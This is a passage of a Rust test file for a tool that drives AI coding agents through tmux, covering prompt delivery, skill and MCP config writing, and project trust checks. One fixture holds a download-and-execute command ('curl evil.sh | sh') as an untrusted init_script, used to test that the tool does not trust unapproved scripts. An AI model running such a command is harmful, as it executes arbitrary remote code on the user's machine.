fn expect_echoing_pane(mock: &mut MockTmuxOperations, echoed: &'static str) {
    // A pane that goes quiet, echoes the paste, and then **submits** — three
    // phases, because delivery and submission are two separate things the code
    // confirms separately.
    //
    // 1. quiet:  `wait_for_pane_settled` needs one baseline capture plus
    //            SETTLE_STABLE_POLLS identical ones; `deliver_message` then takes
    //            its own baseline.
    // 2. echoed: the paste rendered. `deliver_message` sees the change and
    //            returns; `submit_message` then takes its baseline from it.
    // 3. cleared: the Enter took effect. Submitting moves the message up and
    //            empties the composer, which is a visible change — that is how
    //            `submit_message` knows the keystroke was not dropped.
    //
    // Phase 3 is what makes "exactly one Enter" true. Without it the pane looks
    // frozen after the paste, which is precisely the dropped-Enter case, and
    // retrying is then the correct behaviour rather than a bug.
    let quiet = SETTLE_STABLE_POLLS as usize + 2;
    let echo_end = quiet + 2; // deliver_message's confirming poll, then submit_message's baseline
    let calls = std::sync::Arc::new(std::sync::Mutex::new(0usize));
    mock.expect_capture_pane().returning(move |_| {
        let mut n = calls.lock().unwrap();
        *n += 1;
        Ok(if *n <= quiet {
            "idle composer".to_string()
        } else if *n <= echo_end {
            echoed.to_string()
        } else {
            "composer cleared, message submitted".to_string()
        })
    });
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_send_skill_and_prompt_gemini_combined() {
    let mut mock = MockTmuxOperations::new();
    let literal_calls = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let literal_c = literal_calls.clone();

    let pastes = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let pastes_c = pastes.clone();

    mock.expect_send_key().returning(move |_, text| {
        literal_c.lock().unwrap().push(text.to_string());
        Ok(())
    });
    mock.expect_paste_text().returning(move |_, text| {
        pastes_c.lock().unwrap().push(text.to_string());
        Ok(())
    });
    expect_echoing_pane(&mut mock, "/agtx:plan\n\nmy task");

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    send_skill_and_prompt(
        &tmux,
        "sess:win",
        &Some("/agtx:plan".to_string()),
        "my task",
        &None,
        "my task",
        "gemini",
        &[],
        false,
    );
    // The message arrives as one bracketed paste, newlines intact — not as typed
    // keystrokes, which an Ink composer would submit at the first newline.
    let pasted = pastes.lock().unwrap();
    assert_eq!(pasted.len(), 1, "exactly one paste");
    assert!(pasted[0].contains("/agtx:plan") && pasted[0].contains("my task"));
    assert!(pasted[0].contains('\n'), "newlines preserved in the paste");

    let calls = literal_calls.lock().unwrap();
    assert!(
        !calls.iter().any(|c| c.contains("my task")),
        "the message must not also be typed: {calls:?}"
    );
    assert_eq!(
        calls.iter().filter(|c| *c == "Enter").count(),
        1,
        "exactly one Enter submits it: {calls:?}"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_send_skill_and_prompt_codex_combined() {
    let mut mock = MockTmuxOperations::new();
    let literal_calls = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let literal_c = literal_calls.clone();

    let pastes = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let pastes_c = pastes.clone();

    mock.expect_send_key().returning(move |_, text| {
        literal_c.lock().unwrap().push(text.to_string());
        Ok(())
    });
    mock.expect_paste_text().returning(move |_, text| {
        pastes_c.lock().unwrap().push(text.to_string());
        Ok(())
    });
    expect_echoing_pane(&mut mock, "$agtx-plan\n\ndo the thing");

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    send_skill_and_prompt(
        &tmux,
        "sess:win",
        &Some("$agtx-plan".to_string()),
        "do the thing",
        &None,
        "do the thing",
        "codex",
        &[],
        false,
    );
    let pasted = pastes.lock().unwrap();
    assert_eq!(pasted.len(), 1, "exactly one paste");
    assert!(pasted[0].contains("$agtx-plan") && pasted[0].contains("do the thing"));

    // Codex's `$skill` command picker opens on *typing*, not on a paste, so with
    // bracketed paste there is nothing to dismiss and a second Enter would fire
    // into an empty composer.
    // Verified against codex-cli 0.144.5.
    let calls = literal_calls.lock().unwrap();
    assert_eq!(
        calls.iter().filter(|c| *c == "Enter").count(),
        1,
        "codex must send exactly one Enter after a paste: {calls:?}"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_send_skill_and_prompt_claude_with_trigger() {
    let mut mock = MockTmuxOperations::new();
    let keys_calls = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let keys_c = keys_calls.clone();

    mock.expect_send_keys().returning(move |_, k| {
        keys_c.lock().unwrap().push(k.to_string());
        Ok(())
    });
    mock.expect_send_key().returning(|_, _| Ok(()));
    // Return trigger text immediately
    mock.expect_capture_pane()
        .returning(|_| Ok("Ready for input >".to_string()));

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    send_skill_and_prompt(
        &tmux,
        "sess:win",
        &Some("/agtx:plan".to_string()),
        "implement this",
        &Some("Ready for input".to_string()),
        "implement this",
        "claude",
        &[],
        false,
    );
    let calls = keys_calls.lock().unwrap();
    assert!(
        calls.iter().any(|c| c == "/agtx:plan"),
        "skill should be sent"
    );
    assert!(
        calls.iter().any(|c| c == "implement this"),
        "prompt should be sent after trigger"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_send_skill_and_prompt_clear_context_claude() {
    // When clear_context=true and agent is Claude, /clear must be sent first,
    // before the skill and then the task prompt.
    let mut mock = MockTmuxOperations::new();
    let keys_calls = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let keys_c = keys_calls.clone();

    mock.expect_send_keys().returning(move |_, k| {
        keys_c.lock().unwrap().push(k.to_string());
        Ok(())
    });
    mock.expect_send_key().returning(|_, _| Ok(()));
    // Simulate stable pane after /clear so the poll exits quickly.
    mock.expect_capture_pane()
        .returning(|_| Ok("✻ Welcome to Claude Code!".to_string()));

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    send_skill_and_prompt(
        &tmux,
        "sess:win",
        &Some("/agtx:plan".to_string()),
        "do the thing",
        &None,
        "do the thing",
        "claude",
        &[],
        true,
    );
    let calls = keys_calls.lock().unwrap();
    // /clear must appear and must come before the skill command.
    let clear_pos = calls.iter().position(|c| c == "/clear");
    let skill_pos = calls.iter().position(|c| c == "/agtx:plan");
    assert!(clear_pos.is_some(), "/clear should be sent");
    assert!(skill_pos.is_some(), "skill should be sent");
    assert!(
        clear_pos.unwrap() < skill_pos.unwrap(),
        "/clear must be sent before the skill command"
    );
    assert!(
        calls.iter().any(|c| c == "do the thing"),
        "task prompt should be sent"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_send_skill_and_prompt_clear_context_ignored_for_non_claude() {
    // When clear_context=true but agent is not Claude, /clear must NOT be sent.
    let mut mock = MockTmuxOperations::new();
    let keys_calls = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let keys_c = keys_calls.clone();

    mock.expect_send_keys().returning(move |_, k| {
        keys_c.lock().unwrap().push(k.to_string());
        Ok(())
    });
    mock.expect_send_key().returning(|_, _| Ok(()));
    mock.expect_paste_text().returning(|_, _| Ok(()));
    mock.expect_capture_pane().returning(|_| Ok(String::new()));

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    send_skill_and_prompt(
        &tmux,
        "sess:win",
        &None,
        "do the thing",
        &None,
        "do the thing",
        "gemini",
        &[],
        true,
    );
    let calls = keys_calls.lock().unwrap();
    assert!(
        !calls.iter().any(|c| c == "/clear"),
        "/clear must not be sent for non-Claude agents"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_send_skill_and_prompt_prompt_only() {
    let mut mock = MockTmuxOperations::new();
    let keys_calls = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let keys_c = keys_calls.clone();

    mock.expect_send_keys().returning(move |_, k| {
        keys_c.lock().unwrap().push(k.to_string());
        Ok(())
    });

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    send_skill_and_prompt(
        &tmux,
        "sess:win",
        &None,
        "just a prompt",
        &None,
        "just a prompt",
        "claude",
        &[],
        false,
    );
    let calls = keys_calls.lock().unwrap();
    assert_eq!(calls.len(), 1);
    assert_eq!(calls[0], "just a prompt");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_send_skill_and_prompt_void_prefill() {
    let mut mock = MockTmuxOperations::new();
    let texts = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let texts_c = texts.clone();

    // Task-derived text goes through `send_text` (`send-keys -l`), never the
    // key-name path — a prefill that happened to spell "Up" or "Space" would
    // otherwise arrive as an arrow key or a bare space.
    mock.expect_send_text().returning(move |_, text| {
        texts_c.lock().unwrap().push(text.to_string());
        Ok(())
    });
    mock.expect_send_key().never();

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    send_skill_and_prompt(
        &tmux,
        "sess:win",
        &None,
        "",
        &None,
        "fix the login bug",
        "claude",
        &[],
        false,
    );
    let calls = texts.lock().unwrap();
    assert_eq!(calls.len(), 1);
    assert_eq!(calls[0], "fix the login bug");
}

// =============================================================================
// Tests for wait_for_prompt_trigger
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_prompt_trigger_found_immediately() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_capture_pane()
        .returning(|_| Ok("some output\nReady for input >".to_string()));

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    let result = wait_for_prompt_trigger(&tmux, "sess:win", "Ready for input", &[]);
    assert!(result);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_prompt_trigger_auto_dismiss_then_trigger() {
    use crate::config::AutoDismiss;
    let mut mock = MockTmuxOperations::new();
    let call_count = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
    let call_c = call_count.clone();
    let dismiss_sent = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let dismiss_c = dismiss_sent.clone();

    mock.expect_capture_pane().returning(move |_| {
        let n = call_c.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        if n < 8 {
            Ok("Do you accept? [y/n]".to_string())
        } else {
            Ok("Ready for input >".to_string())
        }
    });
    mock.expect_send_key().returning(move |_, k| {
        if k == "y" {
            dismiss_c.store(true, std::sync::atomic::Ordering::SeqCst);
        }
        Ok(())
    });

    let auto_dismiss = vec![AutoDismiss {
        detect: vec!["Do you accept?".to_string()],
        response: "y".to_string(),
    }];

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    let result = wait_for_prompt_trigger(&tmux, "sess:win", "Ready for input", &auto_dismiss);
    assert!(result);
    assert!(dismiss_sent.load(std::sync::atomic::Ordering::SeqCst));
}

// =============================================================================
// Tests for wait_for_agent_ready
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_detects_agent_process() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));
    mock.expect_capture_pane().returning(|_| Ok(String::new()));

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    let result = wait_for_agent_ready(&tmux, "sess:win", None, true);
    assert_eq!(result, Some("sess:win".to_string()));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_detects_ready_indicator() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("Welcome to Gemini\nType your message".to_string()));

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    let result = wait_for_agent_ready(&tmux, "sess:win", None, true);
    assert_eq!(result, Some("sess:win".to_string()));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_claude_bypass_accept() {
    let mut mock = MockTmuxOperations::new();
    let literal_calls = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let literal_c = literal_calls.clone();

    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("Do you trust this? Yes, I accept the terms".to_string()));
    mock.expect_send_key().returning(move |_, k| {
        literal_c.lock().unwrap().push(k.to_string());
        Ok(())
    });

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    let result = wait_for_agent_ready(&tmux, "sess:win", None, true);
    assert_eq!(result, Some("sess:win".to_string()));
    let calls = literal_calls.lock().unwrap();
    assert!(
        calls.contains(&"2".to_string()),
        "should send '2' to accept"
    );
    assert!(calls.contains(&"Enter".to_string()), "should send Enter");
}

// =============================================================================
// Tests for write_skills_to_worktree
// =============================================================================

#[test]
fn test_write_skills_to_worktree_claude() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], false);

    // Canonical skills
    assert!(dir.path().join(".agtx/skills/agtx-plan/SKILL.md").exists());
    assert!(dir
        .path()
        .join(".agtx/skills/agtx-execute/SKILL.md")
        .exists());
    assert!(dir
        .path()
        .join(".agtx/skills/agtx-review/SKILL.md")
        .exists());
    assert!(dir
        .path()
        .join(".agtx/skills/agtx-research/SKILL.md")
        .exists());

    // Claude-native paths
    assert!(dir.path().join(".claude/commands/agtx/plan.md").exists());
    assert!(dir.path().join(".claude/commands/agtx/execute.md").exists());
    assert!(dir.path().join(".claude/commands/agtx/review.md").exists());
    assert!(dir
        .path()
        .join(".claude/commands/agtx/research.md")
        .exists());
}

#[test]
fn test_write_skills_to_worktree_gemini_toml() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["gemini"], false);

    let toml_path = dir.path().join(".gemini/commands/agtx/plan.toml");
    assert!(toml_path.exists());
    let content = std::fs::read_to_string(&toml_path).unwrap();
    assert!(
        content.contains("description"),
        "Gemini TOML should have description field"
    );
    assert!(
        content.contains("prompt"),
        "Gemini TOML should have prompt field"
    );
}

#[test]
fn test_write_skills_to_worktree_codex() {
    // The codex arm appends a trust entry to ~/.codex/config.toml — redirect it.
    let (_home, _guard) = redirect_agent_home();
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["codex"], false);

    // Codex uses subdirectories with SKILL.md
    assert!(dir.path().join(".codex/skills/agtx-plan/SKILL.md").exists());
    assert!(dir
        .path()
        .join(".codex/skills/agtx-execute/SKILL.md")
        .exists());
}

#[test]
fn test_write_skills_to_worktree_opencode() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["opencode"], false);

    let md_path = dir.path().join(".opencode/command/agtx-plan.md");
    assert!(md_path.exists());
    let content = std::fs::read_to_string(&md_path).unwrap();
    assert!(
        content.starts_with("---\ndescription:"),
        "OpenCode should have description frontmatter"
    );
}

#[test]
fn test_write_skills_to_worktree_mcp_claude() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], false);

    let mcp = dir.path().join(".mcp.json");
    assert!(mcp.exists(), ".mcp.json should be written for claude");
    let content = std::fs::read_to_string(&mcp).unwrap();
    let v: serde_json::Value = serde_json::from_str(&content).unwrap();
    assert!(v["mcpServers"]["agtx"]["command"].is_string());
    assert_eq!(v["mcpServers"]["agtx"]["args"][0], "mcp-serve");
}

#[test]
fn test_write_skills_to_worktree_mcp_gemini() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["gemini"], false);

    let cfg = dir.path().join(".gemini/settings.json");
    assert!(
        cfg.exists(),
        ".gemini/settings.json should be written for gemini"
    );
    let content = std::fs::read_to_string(&cfg).unwrap();
    let v: serde_json::Value = serde_json::from_str(&content).unwrap();
    assert!(v["mcpServers"]["agtx"]["command"].is_string());
}

#[test]
fn test_write_skills_to_worktree_mcp_cursor() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["cursor"], false);

    let cfg = dir.path().join(".cursor/mcp.json");
    assert!(
        cfg.exists(),
        ".cursor/mcp.json should be written for cursor"
    );
    let content = std::fs::read_to_string(&cfg).unwrap();
    let v: serde_json::Value = serde_json::from_str(&content).unwrap();
    assert!(v["mcpServers"]["agtx"]["command"].is_string());
}

#[test]
fn test_write_skills_to_worktree_mcp_grok() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["grok"], false);

    let cfg = dir.path().join(".grok/config.toml");
    assert!(cfg.exists(), ".grok/config.toml should be written for grok");
    let content = std::fs::read_to_string(&cfg).unwrap();
    assert!(content.contains("[mcp_servers.agtx]"));
    assert!(content.contains("mcp-serve"));
}

#[test]
fn test_write_skills_to_worktree_mcp_grok_preserves_existing_config() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    let grok_dir = dir.path().join(".grok");
    std::fs::create_dir_all(&grok_dir).unwrap();
    std::fs::write(
        grok_dir.join("config.toml"),
        "[mcp_servers.other]\ncommand = \"other\"\n",
    )
    .unwrap();

    write_skills_to_worktree(&wt, dir.path(), &None, &["grok"], false);

    let content = std::fs::read_to_string(grok_dir.join("config.toml")).unwrap();
    assert!(
        content.contains("[mcp_servers.other]"),
        "a project's own .grok/config.toml must not be clobbered: {content}"
    );
    assert!(content.contains("[mcp_servers.agtx]"));
}

#[test]
fn test_write_skills_to_worktree_grok_skills() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["grok"], false);

    let skill = dir.path().join(".grok/skills/agtx-plan/SKILL.md");
    assert!(
        skill.exists(),
        "grok skills go to .grok/skills/<name>/SKILL.md"
    );
    let content = std::fs::read_to_string(&skill).unwrap();
    assert!(
        content.starts_with("---"),
        "frontmatter must be kept for grok"
    );
    // Canonical copy is always written too
    assert!(dir.path().join(".agtx/skills/agtx-plan/SKILL.md").exists());
}

/// Redirect agent-global trust writes into a per-process temp HOME, and
/// serialize the tests that do so.
///
/// Without the redirect, every run of the suite appends a temp-dir trust entry
/// to the real user's `~/.codex/config.toml` and
/// `~/.gemini/antigravity-cli/settings.json`. The lock is needed because the
/// redirect target is process-global: these writes are read-modify-write on one
/// shared file, so concurrent tests would clobber each other's entries.
///
/// Hold the returned guard for the duration of the test.
fn redirect_agent_home() -> (std::path::PathBuf, std::sync::MutexGuard<'static, ()>) {
    static AGENT_HOME: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
    static LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
    // A panicking test poisons the lock; the data is unit, so recover and carry on.
    let guard = LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let dir = AGENT_HOME.get_or_init(|| tempfile::tempdir().unwrap());
    std::env::set_var("AGTX_AGENT_HOME", dir.path());
    (dir.path().to_path_buf(), guard)
}

/// Point `Database` at a throwaway data root.
///
/// `switch_to_project_keep_sidebar` opens a *real* project database for the path
/// it is handed. Without the redirect every run of the suite leaves an orphan
/// `projects/<hash>.db` in the user's own store, keyed by a temp dir that is
/// gone by the time the test returns. Same reasoning as `redirect_agent_home`,
/// and the lock is needed for the same reason: the target is process-global.
///
/// Hold the returned guard for the duration of the test.
fn redirect_data_dir() -> std::sync::MutexGuard<'static, ()> {
    static DATA_DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
    static LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
    // A panicking test poisons the lock; the data is unit, so recover and carry on.
    let guard = LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let dir = DATA_DIR.get_or_init(|| tempfile::tempdir().unwrap());
    std::env::set_var("AGTX_DATA_DIR", dir.path());
    guard
}

/// Point `TrustStore` at a throwaway config root.
///
/// `App::new` reads the trust store and `install_plugin` writes it, so without
/// the redirect the suite touches the real user's `trusted_projects.toml` and
/// leaves entries keyed by temp dirs that are gone by the time the test
/// returns. Same reasoning as `redirect_data_dir`, and the lock is needed for
/// the same reason: the target is process-global.
///
/// Hold the returned guard for the duration of the test.
#[cfg(feature = "test-mocks")]
fn redirect_config_dir() -> std::sync::MutexGuard<'static, ()> {
    static CONFIG_DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
    static LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
    // A panicking test poisons the lock; the data is unit, so recover and carry on.
    let guard = LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let dir = CONFIG_DIR.get_or_init(|| tempfile::tempdir().unwrap());
    std::env::set_var("AGTX_CONFIG_DIR", dir.path());
    guard
}

/// Build an App rooted at a real on-disk project directory.
///
/// `install_plugin` reads and writes `.agtx/config.toml` through the
/// filesystem, so it needs a path that exists — unlike `make_test_app`, whose
/// `/tmp/test-project` never does.
#[cfg(feature = "test-mocks")]
fn make_test_app_at(project: &std::path::Path) -> App {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    mock_tmux.expect_has_session().returning(|_| false);

    App::new_for_test(
        Some(project.to_path_buf()),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap()
}

/// Picking a workflow plugin writes `.agtx/config.toml`, and trust *is* a hash
/// of that file — so before the re-trust this silently untrusted the project
/// and cost it its `init_script` on the next launch.
#[test]
#[cfg(feature = "test-mocks")]
fn install_plugin_keeps_a_trusted_project_trusted() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path();
    std::fs::create_dir_all(project.join(".agtx")).unwrap();
    std::fs::write(
        project.join(".agtx/config.toml"),
        "init_script = \"echo hi\"\n",
    )
    .unwrap();

    let mut store = crate::config::TrustStore::load().unwrap();
    store.trust_project(project).unwrap();
    assert!(
        store.is_trusted(project),
        "precondition: project is trusted"
    );

    let mut app = make_test_app_at(project);
    app.install_plugin("gsd").unwrap();

    let store = crate::config::TrustStore::load().unwrap();
    assert!(
        store.is_trusted(project),
        "picking a plugin must not untrust the project"
    );
    // And the write it was there to make actually happened.
    let cfg = crate::config::ProjectConfig::load(project).unwrap();
    assert_eq!(cfg.workflow_plugin.as_deref(), Some("gsd"));
}

/// The guard on the re-trust: agtx restores a decision the user already made,
/// it never makes one. A project whose `init_script` was never vouched for must
/// not become trusted just because agtx touched its config.
#[test]
#[cfg(feature = "test-mocks")]
fn install_plugin_does_not_trust_an_untrusted_project() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path();
    std::fs::create_dir_all(project.join(".agtx")).unwrap();
    std::fs::write(
        project.join(".agtx/config.toml"),
        "init_script = \"curl evil.sh | sh\"\n",
    )
    .unwrap();

    let store = crate::config::TrustStore::load().unwrap();
    assert!(
        !store.is_trusted(project),
        "precondition: never-approved config is untrusted"
    );

    let mut app = make_test_app_at(project);
    app.install_plugin("gsd").unwrap();

    let store = crate::config::TrustStore::load().unwrap();
    assert!(
        !store.is_trusted(project),
        "agtx writing the config must not vouch for a script the user never approved"
    );
}

#[test]
fn test_write_skills_to_worktree_mcp_antigravity() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["antigravity"], false);

    let cfg = dir.path().join(".agents/mcp_config.json");
    assert!(
        cfg.exists(),
        ".agents/mcp_config.json should be written for antigravity"
    );
    let content = std::fs::read_to_string(&cfg).unwrap();
    let v: serde_json::Value = serde_json::from_str(&content).unwrap();
    assert!(v["mcpServers"]["agtx"]["command"].is_string());
    assert_eq!(v["mcpServers"]["agtx"]["args"][0], "mcp-serve");
}

#[test]
fn test_write_skills_to_worktree_pi() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["pi"], false);

    // pi discovers `.pi/skills/<name>/SKILL.md`, and only once the project is
    // trusted — which is what the `--approve` in its launch args buys.
    assert!(
        dir.path().join(".pi/skills/agtx-plan/SKILL.md").exists(),
        ".pi/skills/agtx-plan/SKILL.md should be deployed for pi"
    );

    let cfg = dir.path().join(".pi/mcp.json");
    assert!(cfg.exists(), ".pi/mcp.json should be written for pi");
    let v: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&cfg).unwrap()).unwrap();
    assert!(v["mcpServers"]["agtx"]["command"].is_string());
    assert_eq!(v["mcpServers"]["agtx"]["args"][0], "mcp-serve");
}

/// The adapter persists its own per-server `disabled` flags into this same file,
/// so the writer must merge rather than clobber.
#[test]
fn test_write_skills_to_worktree_mcp_pi_preserves_existing_config() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    let pi_dir = dir.path().join(".pi");
    std::fs::create_dir_all(&pi_dir).unwrap();
    std::fs::write(
        pi_dir.join("mcp.json"),
        r#"{"mcpServers":{"other":{"command":"other","disabled":true}},"somethingElse":true}"#,
    )
    .unwrap();

    write_skills_to_worktree(&wt, dir.path(), &None, &["pi"], false);

    let content = std::fs::read_to_string(pi_dir.join("mcp.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&content).unwrap();
    assert_eq!(
        v["mcpServers"]["other"]["disabled"], true,
        "a project's own .pi/mcp.json must not be clobbered: {content}"
    );
    assert_eq!(
        v["somethingElse"], true,
        "top-level sibling keys must survive: {content}"
    );
    assert!(v["mcpServers"]["agtx"]["command"].is_string());
}

#[test]
fn test_write_skills_to_worktree_mcp_antigravity_preserves_existing_config() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    let agents_dir = dir.path().join(".agents");
    std::fs::create_dir_all(&agents_dir).unwrap();
    std::fs::write(
        agents_dir.join("mcp_config.json"),
        r#"{"mcpServers":{"other":{"command":"other"}},"somethingElse":true}"#,
    )
    .unwrap();

    write_skills_to_worktree(&wt, dir.path(), &None, &["antigravity"], false);

    let content = std::fs::read_to_string(agents_dir.join("mcp_config.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&content).unwrap();
    assert_eq!(
        v["mcpServers"]["other"]["command"], "other",
        "a project's own .agents/mcp_config.json must not be clobbered: {content}"
    );
    assert_eq!(
        v["somethingElse"], true,
        "top-level sibling keys must survive: {content}"
    );
    assert!(v["mcpServers"]["agtx"]["command"].is_string());
}

#[test]
fn test_write_skills_to_worktree_mcp_antigravity_replaces_malformed_config() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    let agents_dir = dir.path().join(".agents");
    std::fs::create_dir_all(&agents_dir).unwrap();
    std::fs::write(agents_dir.join("mcp_config.json"), "not json at all").unwrap();

    write_skills_to_worktree(&wt, dir.path(), &None, &["antigravity"], false);

    let content = std::fs::read_to_string(agents_dir.join("mcp_config.json")).unwrap();
    let v: serde_json::Value =
        serde_json::from_str(&content).expect("a malformed file must be replaced with valid JSON");
    assert!(v["mcpServers"]["agtx"]["command"].is_string());
}

#[test]
fn test_write_skills_to_worktree_antigravity_skills() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["antigravity"], false);

    let skill = dir.path().join(".agents/skills/agtx-plan/SKILL.md");
    assert!(
        skill.exists(),
        "antigravity skills go to .agents/skills/<name>/SKILL.md"
    );
    let content = std::fs::read_to_string(&skill).unwrap();
    assert!(
        content.starts_with("---"),
        "frontmatter must be kept for antigravity"
    );
    // Canonical copy is always written too
    assert!(dir.path().join(".agtx/skills/agtx-plan/SKILL.md").exists());
}

#[test]
fn test_write_skills_to_worktree_mcp_codex() {
    let (_home, _guard) = redirect_agent_home();
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["codex"], false);

    let cfg = dir.path().join(".codex/config.toml");
    assert!(
        cfg.exists(),
        ".codex/config.toml should be written for codex"
    );
    let content = std::fs::read_to_string(&cfg).unwrap();
    assert!(content.contains("[mcp_servers.agtx]"));
    assert!(content.contains("mcp-serve"));
}

#[test]
fn test_write_skills_to_worktree_mcp_opencode() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["opencode"], false);

    let cfg = dir.path().join("opencode.json");
    assert!(cfg.exists(), "opencode.json should be written for opencode");
    let content = std::fs::read_to_string(&cfg).unwrap();
    let v: serde_json::Value = serde_json::from_str(&content).unwrap();
    assert_eq!(v["mcp"]["agtx"]["type"], "local");
    assert!(v["mcp"]["agtx"]["command"].is_array());
    assert_eq!(v["mcp"]["agtx"]["command"][1], "mcp-serve");
}

// =============================================================================
// Tests for load_task_plugin
// =============================================================================

#[test]
fn test_load_task_plugin_no_plugin_returns_agtx_default() {
    let task = crate::db::Task::new("Test", "claude", "proj");
    let plugin = load_task_plugin(&task, None, "claude");
    assert!(plugin.is_some());
    assert_eq!(plugin.unwrap().name, "agtx");
}

#[test]
fn test_load_task_plugin_from_disk() {
    // Create a temporary plugin on disk
    let dir = tempfile::tempdir().unwrap();
    let plugin_dir = dir.path().join(".agtx").join("plugins").join("test-plug");
    std::fs::create_dir_all(&plugin_dir).unwrap();
